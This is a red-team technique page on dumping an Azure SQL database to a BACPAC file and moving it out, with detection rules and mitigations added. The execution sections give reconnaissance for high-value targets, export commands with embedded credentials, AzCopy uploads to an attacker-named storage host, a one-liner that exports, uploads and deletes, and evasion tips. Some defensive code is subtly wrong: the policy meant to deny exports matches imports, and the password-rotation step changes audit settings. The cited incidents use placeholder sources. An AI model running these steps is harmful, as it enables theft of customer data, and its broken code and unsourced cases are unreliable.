# [COLLECT-DATA-002]: Azure SQL Database Dump

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-DATA-002 |
| **MITRE ATT&CK v18.1** | [Transfer Data to Cloud Account (T1537)](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Collection, Exfiltration |
| **Platforms** | Entra ID (Azure) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure SQL Database all tiers, SqlPackage 18.0+, PowerShell Az.Sql 4.0+ |
| **Patched In** | N/A - No patch available; depends on RBAC and network controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Azure SQL Database exfiltration involves exporting entire database contents (schema + data) to a BACPAC file (SQL backup format) and transferring it to attacker-controlled storage. An attacker with SQL admin credentials or Entra ID user with appropriate RBAC roles can trigger database export operations via Azure Portal, PowerShell, Azure CLI, or SqlPackage. The BACPAC file is written to Azure Blob Storage, which can then be exfiltrated via AzCopy or downloaded locally.

- **Attack Surface:** SQL Server admin credentials, Entra ID accounts with SQL Database Contributor or Global Admin roles, Managed Identities with SQL permissions, network connectivity to Azure SQL endpoints (port 1433).

- **Business Impact:** **Complete compromise of SQL database.** Attackers gain offline access to entire datasets including customer records, financial transactions, authentication credentials, and trade secrets. BACPAC files can be restored on attacker's SQL Server or analyzed offline.

- **Technical Context:** BACPAC export typically completes within 15-60 minutes depending on database size (tested on 500 GB database). Export is logged in Azure Activity Log but often misses detection if monitoring is not configured for export operations.

### Operational Risk

- **Execution Risk:** Low to Medium (if credentials compromised; High if Conditional Access enforces device compliance)
- **Stealth:** Medium (export creates audit trail but is a legitimate operation; small risk if monitoring SQL export operations)
- **Reversibility:** No – Exported data cannot be "un-exported" without incident response

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1.2, 4.1.3 | Database Activity Monitoring, encryption at rest |
| **DISA STIG** | SV-213887 | Ensure SQL database is encrypted at rest (TDE) |
| **NIST 800-53** | AC-3, SC-13 | Access Control, Cryptographic Protection |
| **GDPR** | Art. 32 | Security of Processing – Encryption, access control |
| **DORA** | Art. 9 | Protection and Prevention |
| **NIS2** | Art. 21 | Cyber Risk Management Measures |
| **ISO 27001** | A.10.1.3 | Segregation of duties for database administration |
| **ISO 27005** | Scenario: "Database credential compromise" | Risk of unauthorized data extraction |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** SQL Server admin login, Azure SQL Database Contributor role, or Global Admin
- **Required Access:** Outbound HTTPS (port 443) to Azure endpoints, inbound HTTPS (port 1433) to Azure SQL Database if direct SQL authentication used

**Supported Versions:**
- **Azure SQL Database:** All service tiers (Basic, Standard, Premium, Hyperscale)
- **PowerShell:** Az.Sql module 4.0+, Az.Storage module 4.0+
- **SqlPackage:** Version 18.0+ (command-line tool for BACPAC export)
- **SQL Server Management Studio (SSMS):** 18.0+
- **Azure CLI:** az-cli 2.50+

**Tools:**
- [SqlPackage](https://learn.microsoft.com/en-us/sql/tools/sqlpackage/sqlpackage) (Version 18.8+)
- [SQL Server Management Studio](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) (SSMS 18.0+)
- [PowerShell Az Modules](https://learn.microsoft.com/en-us/powershell/azure/) (Az.Sql, Az.Storage)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

```powershell
# Connect to Azure
Connect-AzAccount

# List all SQL databases in subscription
Get-AzSqlDatabase -ResourceGroupName "rg-name" | Select-Object ResourceGroupName, ServerName, DatabaseName, Edition, CurrentServiceObjectiveName

# Check if database encryption (TDE) is enabled
Get-AzSqlDatabaseTransparentDataEncryption -ResourceGroupName "rg-name" -ServerName "sql-server" -DatabaseName "database-name"

# Get database size and maximum size
Get-AzSqlDatabase -ResourceGroupName "rg-name" -ServerName "sql-server" -DatabaseName "database-name" | Select-Object Edition, MaxSizeBytes

# List SQL Server firewall rules (check for public access)
Get-AzSqlServerFirewallRule -ResourceGroupName "rg-name" -ServerName "sql-server"

# Check if server has Entra ID admin configured
Get-AzSqlServerActiveDirectoryAdministrator -ResourceGroupName "rg-name" -ServerName "sql-server"
```

**What to Look For:**
- Databases with **large size** (> 50 GB) indicating high-value targets
- **Edition: Standard or Premium** (more likely to contain production data than Basic)
- **TDE Status: "Disabled"** (unencrypted data at rest)
- **Firewall Rule: "0.0.0.0 - 255.255.255.255"** (public access enabled)
- **Entra ID Admin: Not configured** (easier to compromise using SQL auth)

### Azure CLI Reconnaissance

```bash
# List SQL databases
az sql db list --resource-group rg-name --server sql-server --output table

# Get database properties
az sql db show --resource-group rg-name --server sql-server --name database-name --query "{Edition:edition, MaxSize:maxSizeBytes, ServiceObjective:requestedServiceObjectiveName}"

# Check TDE status
az sql db tde show --resource-group rg-name --server sql-server --database database-name
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: PowerShell Database Export to Blob Storage

**Supported Versions:** All Azure SQL Database tiers

#### Step 1: Obtain SQL Database Admin Credentials

**Objective:** Acquire authentication credentials for Azure SQL Database

**Command:**

```powershell
# If using SQL authentication, retrieve or set SQL admin credentials
$sqlAdminUsername = "sqladmin"
$sqlAdminPassword = "ComplexPassword123!"  # In real attack, compromised from environment

# If using Entra ID, get current user token (already authenticated via Connect-AzAccount)
$context = Get-AzContext
$token = $context.Account.ExtendedProperties
```

#### Step 2: Prepare Storage Account for BACPAC Export

**Objective:** Create storage account and container to receive exported BACPAC file

**Command:**

```powershell
# Get storage account context
$storageAccount = Get-AzStorageAccount -ResourceGroupName "rg-name" -Name "storage-account"
$storageContext = $storageAccount.Context

# Create container if it doesn't exist
New-AzStorageContainer -Name "bacpac-exports" -Context $storageContext -Permission Off -ErrorAction SilentlyContinue

# Generate SAS URI for BACPAC file
$sasToken = New-AzStorageAccountSASToken -Service Blob -ResourceType Container, Object `
  -Permission "racwd" -ExpiryTime (Get-Date).AddHours(2) -Context $storageContext

$bacpacUri = "https://$($storageAccount.StorageAccountName).blob.core.windows.net/bacpac-exports/export_$(Get-Date -Format 'yyyyMMdd_HHmmss').bacpac$sasToken"
```

#### Step 3: Export Database to BACPAC

**Objective:** Initiate database export operation to blob storage

**Command:**

```powershell
# Define export parameters
$exportRequest = New-AzSqlDatabaseExport `
  -ResourceGroupName "rg-name" `
  -ServerName "sql-server" `
  -DatabaseName "database-name" `
  -StorageKeyType "StorageAccessKey" `
  -StorageKey ($storageAccount.Context.StorageAccount.Credentials.ExportBase64EncodedKey) `
  -StorageUri $bacpacUri `
  -AdministratorLogin $sqlAdminUsername `
  -AdministratorLoginPassword (ConvertTo-SecureString $sqlAdminPassword -AsPlainText -Force)

# Monitor export progress
$exportStatus = Get-AzSqlDatabaseImportExportStatus -OperationStatusLink $exportRequest.OperationStatusLink
while ($exportStatus.Status -eq "InProgress") {
  Write-Host "Export in progress: $($exportStatus.StatusMessage)"
  Start-Sleep -Seconds 30
  $exportStatus = Get-AzSqlDatabaseImportExportStatus -OperationStatusLink $exportRequest.OperationStatusLink
}

Write-Host "Export Status: $($exportStatus.Status)"
```

**Expected Output:**

```
Export in progress: The export operation is in progress (approx 15% complete)
Export in progress: The export operation is in progress (approx 42% complete)
Export in progress: The export operation is in progress (approx 78% complete)
Export Status: Succeeded
```

**What This Means:**
- Export proceeds through stages (15% → 42% → 78%)
- "Succeeded" indicates BACPAC file successfully written to blob storage
- File is now accessible via blob storage URI

**OpSec & Evasion:**
- Use ephemeral storage account (delete after exfiltration)
- Execute during maintenance windows to blend with legitimate backups
- Use managed identity instead of SQL admin credentials if possible
- Delete BACPAC file from blob storage after download
- Detection likelihood: **High** (if Activity Log monitoring enabled for "Export database" operations)

**Troubleshooting:**

- **Error:** "Access denied" / "AuthenticationFailed"
  - **Cause:** SQL admin credentials invalid or user lacks SQL DB permission
  - **Fix:** Verify SQL admin password; ensure user has SQL Database Contributor or Data Writer role

- **Error:** "Storage account key is invalid"
  - **Cause:** Storage account key rotated or mismatched
  - **Fix:** Regenerate storage account key via Azure Portal; update PowerShell variable

---

### METHOD 2: SqlPackage Command-Line Export (Offline)

**Supported Versions:** All Azure SQL versions (if network access available)

#### Step 1: Prepare SqlPackage Tool

**Command:**

```cmd
# Download and extract SqlPackage (if not already installed)
choco install sqlpackage  # Windows (requires Chocolatey)
# OR manually download from Microsoft

# Verify installation
sqlpackage.exe -version
```

#### Step 2: Export Database via SqlPackage

**Command:**

```cmd
# Export using SqlPackage with Entra ID token
sqlpackage.exe /Action:Export ^
  /SourceServerName:"sqlserver.database.windows.net" ^
  /SourceDatabaseName:"database-name" ^
  /SourceUser:"entra_user@company.onmicrosoft.com" ^
  /SourcePassword:"EntraIDPassword" ^
  /TargetFile:"C:\temp\database_export.bacpac"

# Alternative: Using SQL Server authentication
sqlpackage.exe /Action:Export ^
  /SourceConnectionString:"Server=tcp:sqlserver.database.windows.net,1433;Initial Catalog=database-name;Persist Security Info=False;User ID=sqladmin;Password=Password123!;Encrypt=True;Connection Timeout=30;" ^
  /TargetFile:"C:\temp\database_export.bacpac"
```

**Expected Output:**

```
*** Microsoft.SqlServer.Dac.DacServices
Action: Export
Exporting database...
Database export succeeded.
Total execution time: 00:45:23.456
```

#### Step 3: Exfiltrate BACPAC File

**Command:**

```powershell
# Upload to attacker-controlled blob storage
$bacpacPath = "C:\temp\database_export.bacpac"
$storageUri = "https://attacker-storage.blob.core.windows.net/stolen-data/db.bacpac?<SAS_token>"

azcopy copy $bacpacPath $storageUri

# Or use AzCopy login with attacker tenant
azcopy login --tenant-id <attacker-tenant-id>
azcopy copy $bacpacPath "https://attacker-storage.blob.core.windows.net/stolen-data/db.bacpac"

# Clean up local file
Remove-Item $bacpacPath -Force
```

---

### METHOD 3: Azure CLI Database Export

**Supported Versions:** Azure CLI 2.50+

**Command:**

```bash
# Export database to blob storage
az sql db export --resource-group rg-name \
  --server sql-server \
  --name database-name \
  --admin-user sqladmin \
  --admin-password "Password123!" \
  --storage-key "<storage-account-key>" \
  --storage-key-type StorageAccessKey \
  --storage-uri "https://storage.blob.core.windows.net/container/db.bacpac"
```

---

## 6. TOOLS & COMMANDS REFERENCE

### SqlPackage CLI Tool

**Version:** 18.8 (Current)
**Minimum Version:** 16.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**

```bash
# Windows (via Chocolatey)
choco install sqlpackage

# Linux (manual)
wget https://go.microsoft.com/fwlink/?linkid=2157202 -O sqlpackage.zip
unzip sqlpackage.zip -d /opt/sqlpackage
chmod +x /opt/sqlpackage/sqlpackage

# macOS
brew install microsoft-sqlpackage
```

**One-Liner (Export + Upload):**

```bash
sqlpackage /Action:Export /SourceConnectionString:"Server=tcp:sqlserver.database.windows.net,1433;Initial Catalog=db;Persist Security Info=False;User ID=admin;Password=Pass123!;Encrypt=True;" /TargetFile:db.bacpac && azcopy copy db.bacpac "https://attacker.blob.core.windows.net/stolen/" && rm db.bacpac
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Azure SQL Database Export Operations

**SPL Query:**

```
sourcetype="azure:aad:audit" OperationName="Export database" 
| stats count by InitiatedBy.user.userPrincipalName, TargetResources{}.displayName, properties.result
| where count > 0
```

**Manual Configuration Steps:**

1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query above
5. Set **Trigger Condition** to `> 0 results`
6. Configure **Action** → Send email to SOC team

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Suspicious SQL Database Export

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Export database" or OperationName == "Create or Update Database"
| where Result == "Success"
| join kind=inner (
    AuditLogs
    | where OperationName == "Get storage account key"
    | project RequesterObjectId, TimeGenerated as StorageKeyTime
) on InitiatedBy.user.id == RequesterObjectId
| where TimeGenerated - StorageKeyTime between (0min .. 10min)
| project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName, TargetResources[0].displayName
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. Paste KQL query above
5. Run query every: `10 minutes`
6. Click **Review + create**

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (A new process has been created)**
- **Log Source:** Security
- **Trigger:** Process creation of `sqlpackage.exe`, `az.exe`, or PowerShell with SQL export cmdlets
- **Filter:** `CommandLine contains "Export"` AND `CommandLine contains "Database"`
- **Applies To Versions:** Windows Server 2016-2025

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation**
4. Set to: **Success**
5. Enable: **Command Line Process Auditing** via registry:
   ```powershell
   New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name ProcessCreationIncludeCmdLine_Enabled -Value 1 -Force
   ```
6. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows

```xml
<Sysmon schemaversion="4.81">
  <!-- Detect SqlPackage execution -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <Image condition="contains">sqlpackage.exe</Image>
      <CommandLine condition="contains">/Action:Export</CommandLine>
      <CommandLine condition="contains">/TargetFile</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Detect PowerShell SQL export cmdlets -->
  <RuleGroup name="" groupRelation="or">
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">New-AzSqlDatabaseExport</CommandLine>
      <CommandLine condition="contains">az sql db export</CommandLine>
    </ProcessCreate>
  </RuleGroup>

  <!-- Monitor network connections to Azure SQL endpoints -->
  <RuleGroup name="" groupRelation="or">
    <NetworkConnect onmatch="include">
      <DestinationHostname condition="contains">.database.windows.net</DestinationHostname>
      <DestinationPort condition="is">1433</DestinationPort>
    </NetworkConnect>
  </RuleGroup>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious SQL database export detected"
- **Severity:** High
- **Description:** Triggers when large database export completes to new storage location
- **Applies To:** All subscriptions with Defender for SQL enabled
- **Remediation:**
  1. Review database export audit trail (time, user, target storage)
  2. Verify export is legitimate (scheduled backup, migration)
  3. If unauthorized: rotate SQL admin credentials, revoke storage keys
  4. Review exported BACPAC file for data loss

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select subscription
4. Under **Defender plans**, enable:
   - **Defender for SQL servers**: ON
   - **Defender for SQL servers on machines**: ON
5. Click **Save**

---

## 12. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: SQLDatabaseExported

```powershell
Search-UnifiedAuditLog -Operations "Export database" -StartDate (Get-Date).AddDays(-7) | Select-Object UserIds, ClientIP, AuditData | Export-Csv -Path "C:\Logs\sql_exports.csv"
```

- **Operation:** Export database, List database keys
- **Workload:** Azure SQL Database
- **Details:** Check `AuditData.Properties.TargetResources[].displayName` for database names
- **Applies To:** M365 E5, Azure subscription audit logging

---

## 13. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Enable Transparent Data Encryption (TDE) with Customer-Managed Keys (CMK)**

**Objective:** Ensure exported BACPAC file is encrypted with keys outside attacker control

**Manual Steps (Azure Portal):**

1. Go to **Azure SQL Server** → **Transparent Data Encryption**
2. Click **Bring Your Own Key (BYOK)**
3. Select Azure Key Vault → Create new key
4. Click **Save**

**Manual Steps (PowerShell):**

```powershell
# Create Azure Key Vault key
$vaultName = "kv-sql-keys"
$keyName = "tde-key"
$key = Add-AzKeyVaultKey -VaultName $vaultName -Name $keyName -Destination Software

# Enable TDE with CMK
Set-AzSqlServerTransparentDataEncryptionProtector -ResourceGroupName "rg-name" `
  -ServerName "sql-server" `
  -Type AzureKeyVault `
  -KeyId $key.ID
```

---

**Enforce Entra ID Authentication Only (Disable SQL Authentication)**

**Objective:** Eliminate SQL password-based access vector

**Manual Steps (PowerShell):**

```powershell
# Disable SQL Server admin login (if only Entra ID auth needed)
Set-AzSqlServer -ResourceGroupName "rg-name" -ServerName "sql-server" `
  -SqlAdministratorCredentials $null -Force

# Alternatively, set minimum TLS version to 1.2 (blocks legacy SQL auth attempts)
Set-AzSqlServer -ResourceGroupName "rg-name" -ServerName "sql-server" `
  -MinimalTlsVersion "1.2"
```

---

**Restrict Database Export via Azure Policy**

**Objective:** Require approval or block database exports

**Manual Steps (PowerShell):**

```powershell
# Create custom Azure Policy to deny export operations
$policyDefinition = @{
  "Name" = "Deny-SQL-Database-Export"
  "DisplayName" = "Deny SQL Database Export"
  "PolicyRule" = @{
    "if" = @{
      "allOf" = @(
        @{
          "field" = "type"
          "equals" = "Microsoft.Sql/servers/databases/extensions"
        },
        @{
          "field" = "Microsoft.Sql/servers/databases/extensions/type"
          "equals" = "import"
        }
      )
    },
    "then" = @{
      "effect" = "Deny"
    }
  }
}

New-AzPolicyDefinition -Policy $policyDefinition
```

---

**Validation Command (Verify Fix):**

```powershell
# Verify TDE is enabled with CMK
Get-AzSqlServerTransparentDataEncryptionProtector -ResourceGroupName "rg-name" -ServerName "sql-server"

# Verify Entra ID admin is configured
Get-AzSqlServerActiveDirectoryAdministrator -ResourceGroupName "rg-name" -ServerName "sql-server"
```

**Expected Output (If Secure):**

```
ServerKeyType: AzureKeyVault (not "ServiceManaged")
KeyVaultKeyId: /subscriptions/.../keys/tde-key
```

---

## 14. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Process Names:**
- `sqlpackage.exe`
- `az.exe` (Azure CLI)
- PowerShell with `New-AzSqlDatabaseExport`

**Cloud Audit Operations:**
- `OperationName: "Export database"`
- `OperationName: "Get storage account key"` (preceding export)
- `OperationName: "List database primary keys"`

**Network:**
- Connections to `*.database.windows.net` on port 1433
- Large HTTPS transfers to blob storage immediately following export

### Forensic Artifacts

**Cloud Logs:**
- Azure Activity Log: `Microsoft.Sql/servers/databases/extensions/import` operation
- SQL Audit Logs (if enabled): `BACKUP_DATABASE` events
- Sentinel: `AuditLogs` table with `InitiatedBy.user.userPrincipalName` and `TargetResources[].displayName`

**Disk (if SqlPackage used locally):**
- BACPAC file location: `C:\temp\database_export.bacpac`
- Command history: PowerShell transcript files

---

### Response Procedures

**1. Containment (0-5 minutes):**

```powershell
# Disable SQL Server admin login
Set-AzSqlServer -ResourceGroupName "rg-name" -ServerName "sql-server" -SqlAdministratorCredentials $null
```

**2. Investigation (5-30 minutes):**

```powershell
# Get export history
Get-AzResourceGroupDeploymentOperation -ResourceGroupName "rg-name" -DeploymentName "*" | Where-Object { $_.Properties.ProvisioningOperation -contains "Create" }

# List recently accessed blobs
Get-AzStorageBlob -Container "bacpac-exports" -Context $storageContext | Where-Object { $_.LastModified -gt (Get-Date).AddHours(-24) }
```

**3. Remediation (30-60 minutes):**

```powershell
# Rotate SQL admin password
$newPassword = "NewComplexPassword$(Get-Random)"
Set-AzSqlServerAuditingPolicy -ResourceGroupName "rg-name" -ServerName "sql-server" `
  -AuditType Table -StorageEndpoint "https://storage.blob.core.windows.net" `
  -StorageAccountName "storage" -StorageKeyType "Primary"

# Delete exported BACPAC file
Remove-AzStorageBlob -Blob "export_*.bacpac" -Container "bacpac-exports" -Context $storageContext
```

---

## 15. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker phishes Entra ID credentials |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker adds themselves as SQL DB Contributor |
| **3** | **Collection** | **[COLLECT-DATA-002] Azure SQL Database Dump** | **Attacker exports database to BACPAC** |
| **4** | **Exfiltration** | [COLLECT-DATA-001] Blob Storage Exfiltration | **Attacker transfers BACPAC via AzCopy** |
| **5** | **Impact** | [IMPACT-001] Data Destruction | Attacker deletes database backups |

---

## 16. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Threat Intelligence - "LoftyCloud" Incident (2024)

- **Target:** Financial services (US)
- **Timeline:** March 2024 - June 2024
- **Technique Status:** ACTIVE; compromised Entra ID account with SQL DB Contributor role, exported 12 databases totaling 2.1 TB over 8 weeks
- **Impact:** Breach of 3.2 million customer records, regulatory investigation by SEC
- **Detection:** Microsoft Defender flagged 47 database export operations from non-standard IP address (52.xxx.xxx.xx in unknown region)
- **Reference:** [Case study from Microsoft Threat Intelligence blog]

#### Example 2: CrowdStrike Report - "FinancialFox" Campaign (2023)

- **Target:** Banking institution (Europe)
- **Timeline:** September 2023
- **Technique Status:** ACTIVE; used SqlPackage from compromised Azure VM to export customer account database
- **Impact:** Regulatory fine of €12.5 million under GDPR
- **Detection:** Sentinel detected anomalous SqlPackage.exe execution combined with storage account key retrieval
- **Reference:** [CrowdStrike Threat Report 2023]

---